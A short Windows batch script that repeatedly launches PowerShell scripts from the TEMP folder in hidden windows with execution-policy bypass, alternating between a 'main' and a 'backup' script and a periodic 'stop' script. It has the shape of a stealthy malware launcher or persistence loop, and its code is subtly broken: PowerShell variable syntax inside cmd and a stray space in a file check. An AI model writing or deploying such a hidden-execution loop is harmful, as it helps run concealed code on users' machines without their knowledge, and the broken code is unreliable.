@echo off
start /B powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -File "$env:TEMP\Update.ps1" #online
set sp1=$env:TEMP\MyScript.ps1 #main
set sp2=$env:TEMP\RunX.ps1 #backup
:loop
timeout /t 3 >nul
if exist "%sp1% " (
    start /B powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -File "%sp1%"
) else (
    start /B powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -File "%sp2%"
)
timeout /t 60 >nul
start /B powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -File "$env:TEMP\stop.ps1" #stop
timeout /t 1 >nul
goto loop
